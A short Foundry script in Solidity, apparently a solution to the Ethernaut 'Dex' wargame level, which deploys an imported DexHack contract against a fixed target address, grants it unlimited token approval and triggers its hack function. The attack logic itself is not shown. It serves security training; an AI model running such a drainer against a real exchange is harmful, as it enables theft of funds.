// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DexHack} from "ethernaut/dex_hack.sol";
import {IDex} from "ethernaut/dex_hack.sol";
import "forge-std/console.sol";

contract DexHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address target = address(0x9d68eF65a63E49BAF9f8492983Ba6d65c579531d);
        DexHack dexHack = new DexHack(target);
        IDex(target).approve(address(dexHack), type(uint).max);
        dexHack.hack();
        vm.stopBroadcast();
    }
}
